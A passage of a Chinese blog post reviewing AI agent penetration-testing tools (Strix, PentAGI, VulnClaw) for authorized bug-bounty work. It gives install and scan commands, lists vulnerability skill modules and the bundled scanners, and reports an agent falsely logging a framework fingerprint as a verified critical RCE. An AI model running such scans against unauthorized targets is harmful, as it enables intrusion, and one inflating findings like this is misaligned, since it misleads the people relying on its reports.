相比 PentAGI 的 20.9k 和 VulnClaw 的 2.1k，42.5k star 背后是整个 Agentic Security 社区对"开箱即用"投的票——这也是笔者愿意把它推进补天交付流程的原因之一：社区已经替笔者做过一轮选型。但 201 个 open issue 和 17 个 release 里也确实堆了不少待打磨的边缘 case，成熟度是**\*\*应用层成熟度\*\***而不是**\*\*完美无缺的工程成熟度\*\***。
### 4.2 单容器配置：Strix 的成熟从安装感开始
*\`\`\`textdocker pull ghcr.io/usestrix/strix-sandbox:1.0.0uv tool install strix-agent==1.1.0strix config set LLM_API_KEY=...strix -n -m deep -t https://target.tld --instruction-file inst.md\`\`\`*
一个 *\`strix-sandbox\`* 镜像就齐活，相比 PentAGI 那 20 个容器简直是另一个量级。这份"成熟感"先从部署体感上立住。
源码上能看到的成熟工程细节还有：LiteLLM 100+ Provider 路由、Caido（而不是 Burp，原因文档里说 Burp 太重 / Yakit 又缺 MCP）作代理、PR-diff scope 的 *\`--scope-mode diff --diff-base origin/main\`*、*\`--max-budget-usd\`* 按轮封顶费用、SARIF 2.1.0 输出、退出码 *\`0\`*（无漏洞）/ *\`2\`*（发现漏洞，不是失败而是 clean exit）这些都已就位。这些细节不当面撞你是感觉不到的，等笔者被 PentAGI 折磨过容器网络再看 Strix 这份"考虑过 CI/CD 集成"的设计，对照感非常强。
### 4.3 多 Agent + Skill 体系
Strix 也是多 Agent，但调度思路跟 PentAGI 不一样——Root Agent 用 *\`create_agent\`* 派生子 Agent，并且是**\*\*按"目标组件 + 漏洞类"动态命名\*\***。XXX 那次实测笔者亲眼看见它在 root 下开了这些 agent：
*\`\`\`textFanwei OA Cluster Specialistztapi Auth & IDOR Testerai.xxx.com AI Platform Specialistscm CORS & Info Disclosure ValidatorSecurity Headers Reporting AgentCORS & Config Misconfig Specialist\`\`\`*
每个子 Agent 并行批量测自己负责的那一片，再由 *\`finish_scan\`* 做归并去重，这是 Strix"多 Agent"的体感来源——不是 13 个固定角色，而是按目标动态生成的专家阵。
Skill 体系是 Strix 最厚的资产。*\`strix/skills/\`* 目录下大致是这样：
*\`\``text漏洞类 Skill (~21 个)  sql_injection / xss / idor / ssrf / ssti / rce / csrf / xxe  race_conditions / nosql_injection / open_redirect / path_traversal_lfi_rfi  mass_assignment / business_logic / authentication_jwt  broken_function_level_authorization / header_injection  http_request_smuggling / information_disclosure  insecure_file_uploads / subdomain_takeover*

### 4.6 缺点也很直白：工具集偏薄
直接说短板。Strix 没有像 PentAGI 那种 Kali worker——内置可调用的"真工具"基本就是 nmap / nuclei / semgrep / sqlmap / ffuf / katana / naabu / subfinder / httpx 这套侦察 + 通用漏扫组合；浏览器自动化只有 Playwright，没有 metasploit、没有商业级漏扫、没有 wifi/bluetooth/工控类扩展，爆破主要靠 nuclei 模板 + 弱密码 Skill 文本。
Skill 文本填补了一大部分——很多能力不算"调一个工具"，而是让 LLM 自己写 payload、自己 fetch 自绕。比如某些 Web 漏洞的 payload 构造，Strix 让 agent 读 *\`sql_injection\`* Skill 的 reference 文档，然后在 sandbox 里写一段 Python 自己发包——而不是真去调 sqlmap。这种 LLM 桥接当然灵活，但比 PentAGI 在 Kali 容器里直接跑 sqlmap / MSF 要脆弱：payload 写错了你得自己 debug，没有真工具那种"工具权威背书"的稳定感。
笔者的建议是：**\*\*把 Strix 当成"主流程编排 + 报告交付"层，外围加一层你自管的 Kali 容器或 Yakit/Witness 这类带 MCP 的攻击面工具补刀\*\***。Strix v1.1.0 还没开放官方 MCP 插件机制，目前能下游扩展的只有 Skill 文本——这是个等社区填的坑，但当下不影响拿它去做中小型 SRC 交付。
### 4.7 笔者感想想明
Strix 是笔者目前三件里**\*\*唯一推荐给普通安全工程师"拿来就用"的那一个\*\***：
- 配置简单：单容器 + 单条 CLI（*\`strix -n -m deep --target-list targets.txt --instruction-file inst.md\`*）；- 成本友好：DeepSeek 把单轮大型企业外网压在 **\*\*$2.04\*\*** 量级，96M cached 让它即使中途卡死也能用 *\`--resume\`* 救回；- 报告闭环：补天 11 字段 DOCX + 3 行 *\`立即处置 / 根因修复 / 长期加固\`* + Phase 7 自优化把每次复盘都写回白名单 SOP 文档；- 多 Agent 编排成熟：动态命名的子 Agent + LiteLLM 多厂商 + Skill 兜底，比 PentAGI 容器栈轻得多。
**\*\*唯一明显短板是工具集相对单薄\*\***，靠 Skill 文本让 LLM 兜底很多东西。这是等社区填的坑——对当下拿来交付小到中型 SRC 不构成障碍，但是真要打深度场景（提权、内网横移、特殊协议）就会撞墙。
*\>* **\*\*一句话\*\****：成熟到能直接交 SRC 的那一件。配置最简，钱包最友好，唯一负资产是工具集等社区补。*

### 5.4 三条笔者用下来的硬结论
1. **\*\*AI 把"发现"做得不错，"定级"必须人审。\*\*** Strix 这次把这件事写在笔者帮助撰写的 *\`calibration-guide.md\`* 开篇就一句话——Strix 管"发现"，校准指南管"定级"，AI 的原始严重度系统性偏高；XXX 31 → 26 这个规律也并不是 Strix 的功劳，是笔者逐条降出来的。更别提 VulnClaw v0.3.3 靶场实测里 agent 自己就把"识别出 ThinkPHP"当成"已确认 Critical RCE"写进了"已验证漏洞"——AI 把"发现"和"利用/定级"的边界从设计层就被涮了。这件事不是个例，是这一代 Agentic Security 的共同假设缺陷。2. **\*\*Agentic Security 的真成本不在 LLM 单价，而在冗余控制。\*\*** PentAGI 把这件事暴露得最赤裸：Summarizer 雪崩 57% → 84.5%、同一份 HTML 被引用 1610 次、状态三套话。LLM 单价越便宜，冗余次数越多越亏——这件事只有在账单 + Langfuse 上看了才会留下印象。3. **\*\*国产模型已经站在这条赛道上了\*\***：DeepSeek-v4-pro 把 Strix xxx 整轮压在 $2.04、GLM-5.2 当 PentAGI Primary、Kimi 当 Pentester——但 OpenAI / Anthropic / Google 经 OpenRouter 走 red-team 工作负载全部 tripped TOS 403，这件事得摆在桌面上承认。
## 六、写在最后
跑完三件之后，笔者最大的体会是：**\*\*成熟度 ≠ 拿来即用\*\***。
- PentAGI 成熟到看着像成品，但成本和资源最不友好，你不养一台工作站和运维都陪它玩不动；- Strix 单容器部署最轻、单轮最便宜、报告骨架最规范，可拿来即用的程度仍取决于你愿不愿意把补天规则一笔笔对着它沉淀——4.4 那套"开箱交付"是笔者前后 5 次重写加 8 阶段 SOP 迭代出来的，不是 Strix 一开盖就给你的；- VulnClaw 是值得长期关注的成长品，Evidence Gate 是它的真护城河，工具链成熟度是它的当下天花板，2.4 那次靶场实测已经把它"把框架识别写成已验证 Critical RCE"的当下短板如实摆了出来。
三件不是互相替代，是互相照镜子——VulnClaw 教你"对抗幻觉的工程手段"，PentAGI 教你"多 Agent 编排的完整架构样板"，Strix 教你"在工程成熟度上具备把 AI 安全做到甲方能接受厚度的骨架"。
**\*\*关于后续更新。\*\*** 三件工具的迭代速度都很快，这篇博客只对应 7 月 18 日之前的代码版本。如果后续有大版本（或笔者继续实验拿到新的实测数据），会在博客补充更新。本文可视为这个暑假探索的 Lv.1 版本——Lv.2 等一个版本大更或者更完整的 SRC 实战回来再说。如果你和笔者一样不是科班安全出身，靠的是高中兴趣摸 Kali / Burp 那点底子，再加上暑假想试 AI 辅助 SRC 变现——按你的实际诉求挑一件：日常 SRC 就 Strix（且做好"它只负责骨架 + 笔者负责沉淀规则"的心理预期），研究靶场就 PentAGI，CTF 单兵等 VulnClaw 长大。三件你迟早都会去试，它们的功能点也会一直互相追，但没有任何一件是"开盖即变现"的钥匙。
*\> ⚠️* **\*\*最后一句重要的话\*\****：本系列实测均在***\*\*自有靶场、vulhub 镜像、补天已授权 SRC 目标\*\****范围内执行。Agentic 工具的红线靠 Skills 和 instruction 文件来定，但真正守边界的是人——AI 不是免责理由。授权、scope、最小影响这三件事永远在 LLM 上面那一层。任何把 AI Agent 当免责盾牌去打未授权目标的行为，都与本系列无关。*
